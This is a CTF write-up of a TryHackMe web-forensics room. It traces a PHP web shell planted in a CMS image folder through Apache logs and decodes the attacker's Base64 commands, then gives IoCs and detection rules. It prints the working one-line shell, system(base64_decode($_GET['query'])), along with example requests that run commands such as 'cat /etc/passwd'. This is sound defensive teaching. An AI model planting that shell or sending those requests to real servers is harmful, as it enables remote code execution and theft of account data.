# 🐚 Infinity Shell — TryHackMe Writeup

**📅 Day 136 — 365 Days of Cybersecurity**
**✅ Status: Completed**
**🏷️ Tags:** `Web Forensics` `PHP Web Shell` `Apache Logs` `Base64` `Log Analysis` `DFIR` `Linux` `CTF`
**⚙️ Difficulty:** Easy

---

## 🧠 Overview

In this room I investigated a compromised web server that had been backdoored with a **PHP web shell**. The attacker exploited a vulnerable CMS to upload a malicious PHP file, then used it to execute arbitrary commands on the server — all encoded in Base64 to evade detection.

The investigation focuses on three core forensic skills:

1. **File system analysis** — locating the web shell on disk
2. **Log analysis** — tracing attacker activity through Apache access logs
3. **Payload decoding** — reconstructing the commands the attacker ran via Base64 decoding

> **Core principle:** Web shells leave two traces — the file on disk and the requests in the logs. If you find one, the other will tell you everything the attacker did.

---

## 🎯 Learning Objectives

- Navigate a Linux web server file system to locate malicious files
- Recognize the anatomy of a PHP web shell and how it enables RCE
- Extract attacker activity from Apache access logs using `grep`
- Decode Base64-obfuscated commands to reconstruct the attacker's actions
- Understand the post-exploitation recon pattern used after web shell deployment

---

## 🗂️ Environment

| Detail | Value |
|---|---|
| Target | Linux web server (Apache + PHP) |
| Web root | `/var/www/html/` |
| CMS | `CMSsite-master` |
| Log location | `/var/log/apache2/` |
| Shell location | `/var/www/html/CMSsite-master/img/images.php` |

---

## 🔍 Step 1 — Locating the Web Root

The first step in any web server forensic investigation is navigating to the web root — the directory that Apache serves publicly. This is where uploaded or planted web shells will live.

```bash
cd /var/www/html/
ls -la
```

This revealed a CMS application directory: `CMSsite-master`.

> **Why CMS applications are frequent targets:** Content Management Systems like WordPress, Joomla, and custom CMSes often have file upload functionality, plugin/theme vulnerabilities, and misconfigured permissions — making them common initial access vectors. Attackers look for writable directories to drop web shells.

---

## 🔍 Step 2 — Finding the Web Shell

Inside the CMS directory, the most likely locations for a planted web shell are directories meant for user-uploaded content:

```bash
cd CMSsite-master/img/
ls -la
```

**Suspicious file found:** `images.php`

The name is deliberately misleading — `images.php` sounds like it could be a legitimate image-processing script. This is classic **masquerading** (T1036): the attacker names the shell to blend in with the surrounding context.

### Examining the Web Shell

```bash
cat images.php
```

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This is one of the simplest and most effective PHP backdoors in existence — just **one line of code** that grants full Remote Code Execution (RCE).

### Anatomy of the Web Shell

```
<?php                          ← PHP execution context
  system(                      ← executes a system command and returns output
    base64_decode(             ← decodes the attacker's obfuscated command
      $_GET['query']           ← command arrives via HTTP GET parameter
    )
  );
?>
```

**How the attacker uses it:**

```
# Attacker sends this HTTP request:
GET /CMSsite-master/img/images.php?query=d2hvYW1pCg== HTTP/1.1

# PHP decodes the Base64:
base64_decode("d2hvYW1pCg==") → "whoami"

# PHP executes it:
system("whoami") → www-data

# Output is returned in the HTTP response body
```

### Why Base64 Encoding?

| Without encoding | With Base64 encoding |
|---|---|
| `?query=cat /etc/passwd` | `?query=Y2F0IC9ldGMvcGFzc3dkCg==` |
| Easily flagged by WAFs | Bypasses naive keyword-based detection |
| Readable in logs | Requires decoding to understand |
| Blocked by input validation | Appears as an alphanumeric string |

Base64 isn't encryption — it's trivially reversible. But it adds a layer of obfuscation that defeats simple log alerting rules that look for keywords like `whoami`, `passwd`, or `cat`.

---

## 🔍 Step 3 — Apache Log Analysis

With the web shell identified, the next step is tracing exactly what the attacker did by analyzing the Apache access logs. Every HTTP request to the server leaves a line in the log — including every command the attacker ran through the shell.

```bash
cd /var/log/apache2/
cat other_vhosts_access.log.1 | grep images.php
```

> **Why `other_vhosts_access.log.1`?** Apache rotates logs periodically. The `.1` suffix indicates the previous log file before the last rotation — the attacker's activity may have occurred in a prior session, so checking rotated logs is essential.

### What the Log Entries Look Like

```
192.168.x.x - - [date] "GET /CMSsite-master/img/images.php?query=d2hvYW1pCg== HTTP/1.1" 200 9
192.168.x.x - - [date] "GET /CMSsite-master/img/images.php?query=bHMK HTTP/1.1" 200 142
192.168.x.x - - [date] "GET /CMSsite-master/img/images.php?query=aWQK HTTP/1.1" 200 54
192.168.x.x - - [date] "GET /CMSsite-master/img/images.php?query=aWZjb25maWcK HTTP/1.1" 200 1243
192.168.x.x - - [date] "GET /CMSsite-master/img/images.php?query=Y2F0IC9ldGMvcGFzc3dkCg== HTTP/1.1" 200 2219
```

### Reading Apache Log Fields

```
[IP] [ident] [user] [timestamp] "[method] [path]?[params] [protocol]" [status] [bytes]

192.168.x.x - - [14/Jan/2023:10:23:01] "GET /img/images.php?query=d2hvYW1pCg==" 200 9
    ↑                    ↑                        ↑                    ↑         ↑   ↑
 Attacker IP          Timestamp              Shell path          Base64 cmd    OK  Response size (bytes)
```

**The HTTP 200 status code** on every line confirms each command was successfully executed — the server processed the request and returned output. A 500 would indicate a PHP error; a 404 would mean the file wasn't found.

**Response size (bytes) is a forensic indicator:** A large byte count (like 2219 for `cat /etc/passwd`) confirms data was returned — the command produced output. A tiny byte count (like 9 for `whoami`) confirms minimal output (just the username).

---

## 🔍 Step 4 — Decoding the Attacker's Commands

With the Base64 strings extracted from the logs, we can now reconstruct the full sequence of commands the attacker ran.

### Decoding Method

```bash
# Inline decode — fastest for individual strings
echo "<base64_string>" | base64 -d

# Alternative using Python
python3 -c "import base64; print(base64.b64decode('<string>').decode())"

# CyberChef (GUI option): From Base64 → Magic
```

### Full Decoded Attack Sequence

| Log order | Base64 string | Decoded command | Purpose |
|---|---|---|---|
| 1 | `d2hvYW1pCg==` | `whoami` | Identify current user context |
| 2 | `bHMK` | `ls` | List files in current directory |
| 3 | `aWQK` | `id` | Get UID, GID, and group memberships |
| 4 | `aWZjb25maWcK` | `ifconfig` | Enumerate network interfaces and IPs |
| 5 | `Y2F0IC9ldGMvcGFzc3dkCg==` | `cat /etc/passwd` | Read system user accounts |
| 6 | *(flag payload)* | `echo 'THM{...}'` | Flag extraction |

### What the Attack Sequence Reveals

This is a textbook **post-exploitation reconnaissance** pattern — the attacker followed a deliberate order:

```
whoami      → "Am I running as www-data? root? What's my privilege level?"
ls          → "What files are in the current directory? Anything useful?"
id          → "What groups am I in? Do I have sudo access?"
ifconfig    → "What's the network topology? Are there internal IPs I can pivot to?"
cat /etc/passwd → "What users exist on this system? Any service accounts I can target?"
```

This sequence is almost identical to what automated post-exploitation frameworks like **Metasploit's `post/multi/recon/local_exploit_suggester`** or **LinPEAS** run — the attacker was doing manual enumeration following the same logic.

---

## 🧬 Full Attack Chain

```
[INITIAL ACCESS]
  Attacker exploits CMS vulnerability (file upload bypass / directory traversal)
  Uploads images.php (web shell) to /img/ directory
  T1190 — Exploit Public-Facing Application
  T1505.003 — Server Software Component: Web Shell

       ↓
[EXECUTION]
  Attacker sends HTTP GET requests with Base64-encoded commands
  PHP executes commands via system() and returns output
  T1059.004 — Unix Shell
  T1027 — Obfuscated Files (Base64 encoding)

       ↓
[DISCOVERY]
  whoami → confirms user context (www-data)
  id → confirms privileges and group memberships
  ifconfig → maps network topology
  cat /etc/passwd → enumerates system users
  T1033 — System Owner/User Discovery
  T1016 — System Network Configuration Discovery
  T1087.001 — Account Discovery: Local Account

       ↓
[OBJECTIVE ACHIEVED]
  Flag extracted from server via web shell execution
```

---

## 🚨 Indicators of Compromise (IoCs)

### File-Based
| IoC | Description |
|---|---|
| `/var/www/html/CMSsite-master/img/images.php` | Web shell — PHP one-liner with `system()` + `base64_decode()` |
| Files with `.php` extension in image/upload directories | Unexpected PHP in media directories is always suspicious |

### Log-Based
| IoC | Description |
|---|---|
| GET requests to `images.php` with `query=` parameter | Direct web shell invocation |
| Base64-encoded strings in URL query parameters | Obfuscation indicator |
| High HTTP 200 response rate from a single IP to the same endpoint | Confirms successful RCE |
| Unusual byte-count responses from static-looking files | Output being returned from shell commands |

### Behavioral
- PHP file in an image directory (`/img/`, `/uploads/`, `/media/`)
- `system()`, `exec()`, `passthru()`, or `shell_exec()` calls in web-accessible PHP files
- Web server process (`www-data`, `apache`) spawning shell commands (`whoami`, `id`, `ifconfig`)

---

## 🛡️ Detection & Prevention

### Detection Rules

```bash
# Find PHP files in upload/image directories (Linux CLI)
find /var/www/html -path "*/img/*.php" -o -path "*/uploads/*.php" \
     -o -path "*/media/*.php" 2>/dev/null

# Search for dangerous PHP functions in web root
grep -rn "system\|exec\|passthru\|shell_exec\|base64_decode" /var/www/html/ \
     --include="*.php"

# Grep Apache logs for base64 patterns in query strings
grep -E "query=[A-Za-z0-9+/]{10,}={0,2}" /var/log/apache2/access.log

# Find recently modified PHP files (potential web shell uploads)
find /var/www/html -name "*.php" -newer /var/www/html/index.php -ls
```

```sql
-- SIEM rule: PHP file accessed with base64 query parameter
http.request.uri CONTAINS ".php" AND
http.request.uri CONTAINS "query=" AND
http.request.uri MATCHES "[A-Za-z0-9+/]{20,}={0,2}" AND
http.response.status_code = 200
```

### Prevention

| Control | Implementation |
|---|---|
| **Disable PHP in upload directories** | Apache: `php_flag engine off` in `.htaccess` for upload dirs |
| **File type validation** | Server-side whitelist of allowed extensions — never trust the client |
| **Content inspection** | Check MIME type (magic bytes) not just file extension |
| **Web Application Firewall (WAF)** | ModSecurity rules to block known web shell signatures |
| **File integrity monitoring** | Alert on new `.php` files created in web root |
| **Principle of least privilege** | Web server should not run as root — `www-data` limits blast radius |
| **Log monitoring** | Alert on repeated requests to the same PHP file with varying parameters |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `ls -la` | Directory listing with hidden files and permissions |
| `cat` | Read file contents |
| `grep` | Filter Apache logs for specific file names or patterns |
| `echo \| base64 -d` | Decode Base64-encoded attacker commands |
| **CyberChef** | GUI-based Base64 decoding (alternative method) |
| **Apache access logs** | Primary evidence source for attacker activity reconstruction |

---

## 🧪 Key Concepts Practiced

- Web server file system navigation and suspicious file identification
- PHP web shell recognition — understanding `system()`, `base64_decode()`, `$_GET`
- Apache access log structure and forensic interpretation
- Base64 decoding for command reconstruction
- Post-exploitation reconnaissance pattern recognition
- Correlating log entries with commands to rebuild attacker timeline

---

## 🧠 Key Takeaways

1. **One line of PHP = full server compromise.** `<?php system(base64_decode($_GET['query'])); ?>` is 52 characters that give an attacker complete control over the server. File upload restrictions are critical — a misconfigured CMS can undo every other security control.

2. **Logs are the attacker's trail they can't erase.** Every command executed through the web shell left a permanent entry in the Apache access log. Even if the attacker deleted the web shell file after the attack, the logs would still document every action taken.

3. **Base64 is obfuscation, not encryption.** It's trivially reversible with `base64 -d`. Its purpose is to bypass keyword-based WAF rules and make log analysis harder — not to actually hide the data from a determined analyst.

4. **Location anomalies are the key indicator.** A PHP file in an `/img/` directory has no legitimate reason to exist. File type should match directory purpose — any deviation warrants immediate investigation.

5. **Response byte count tells you if commands worked.** In Apache logs, `200 9` (9 bytes) after a `whoami` request means the server returned a short string (the username). `200 2219` after `cat /etc/passwd` means 2KB of data was exfiltrated. Byte counts help confirm successful execution even before decoding the command.

6. **Post-exploitation recon follows a predictable pattern.** `whoami → id → ifconfig → cat /etc/passwd` is nearly universal. Building detection rules around this command sequence (executed by the web server process) catches attackers regardless of what specific web shell they use.

---

## 📌 Final Thoughts

Infinity Shell is a compact but highly practical room that covers the fundamental workflow of **web shell forensics** — a skill that's directly applicable to real-world incident response. Web shells remain one of the most common persistence mechanisms seen in compromised web servers, and the investigation methodology practiced here (find the file → read the logs → decode the commands) is exactly what you'd do in a live incident.

The room also reinforces a critical mindset shift: **the attacker's activity lives in the logs even when the file is gone.** In real incidents, attackers frequently delete their web shells after establishing persistence through other means — but the Apache logs preserve the full history of what was done.

---
